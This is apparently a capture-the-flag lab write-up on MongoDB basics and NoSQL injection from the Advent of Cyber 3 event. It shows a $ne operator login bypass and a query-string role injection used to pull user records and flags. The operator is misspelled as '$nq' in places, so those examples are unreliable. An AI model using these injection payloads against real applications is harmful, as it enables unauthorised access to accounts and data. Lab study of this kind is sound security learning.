# NoSQL && NoSQL Injections!

What's NoSQL:
- is a non relational Database! it is data-storing and data-retreiving system! mostly used for Big Dta and IoT devices due to their powerful features. (fast queries, easy to use! and flexible data structure)

- Different between relational and non-relational databases!

|relational|non-relational|
|---------|---------|
|Tables|Collections|
|Rows/Records|Documents|
|Fields|Columns|

[!****](https://jelvix.com/wp-content/uploads/2020/05/relational-vs-nonrelational.jpg)

[MangoDB Operators](https://docs.mongodb.com/manual/reference/operator/query/) Supports BSON and JSON.

## Mongo Notes:

Creating a database!
	- ```use``` command is used to connect to a database if it exists or create a new one if it doesn't exist.

Create Collections!
	- ```db.createCollection()```
		- db.createCollection("users")
		- db.createCollection("roles")

Show Collections!
	- ```db.getCollectionNames();```

Insert into Collections!
	- ```db.getCollectionNames();```
		- ```db.users.insert({id:"1", username: "admin", email: "admin@thm.labs", password: "idk2021!"})```

Show Available documents within the collection
	- ```db.<COLLECTION>.find()```

Update a Document!
	- ```db.users.update({id:"2"}, {$set: {username: "tryhackme"}});```

Delete a Document!
	- ```db.users.remove({'id':'2'})```

Dropping a Collection!
	- ```db.<COLLECTION>.drop()```

*** 

## Task 1 

![****](/Advent%20of%20Cyber%203/Screenshots/Task7/1.PNG)

![****](/Advent%20of%20Cyber%203/Screenshots/Task7/2.PNG)

![****](/Advent%20of%20Cyber%203/Screenshots/Task7/3.PNG)

```json
{ "_id" : ObjectId("618806af0afbc09bdf42bd6a"), "flag" : "THM{8814a5e6662a97*************}" }
```

## Task 2

![****](/Advent%20of%20Cyber%203/Screenshots/Task7/3.PNG)

How it works!

- A normal query! it will return bad credentials as the password is incorrect for admin!

```json
db.users.findOne({username: "admin", password: "password"})
```

- After the Injection! The password from the previous attempt is not ```password``` so we added ```[$nq]``` stands for ```not equal``` to the request! to let us in without the need for the correct password!
	- We are telling MongoDB to find a document (user) with a username equal to admin and his password is not equal to password. (which turns this statement to TRUE because the admin's password is not xyz.)

```json
db.users.findOne({username: "admin", password: {"$ne":"password"}})
```

![****](/Advent%20of%20Cyber%203/Screenshots/Task7/5.png)

## Task 3

![****](/Advent%20of%20Cyber%203/Screenshots/Task7/6.png)


![****](/Advent%20of%20Cyber%203/Screenshots/Task7/7.png)

How it worked!
- We are telling MongoDB to search for an username doesn't equal the value we give it! and with the role of guest! means it will drop us any user with role is guest! We got the flag!

## Task 4

- ```mcskidy``` record

- I predicted the role of mcskidy! which was correct! ```admin```

![****](/Advent%20of%20Cyber%203/Screenshots/Task7/8.png)


![****](/Advent%20of%20Cyber%203/Screenshots/Task7/9.png)

Another method!
```
search?username=mcskidy&role[$nq]=something
```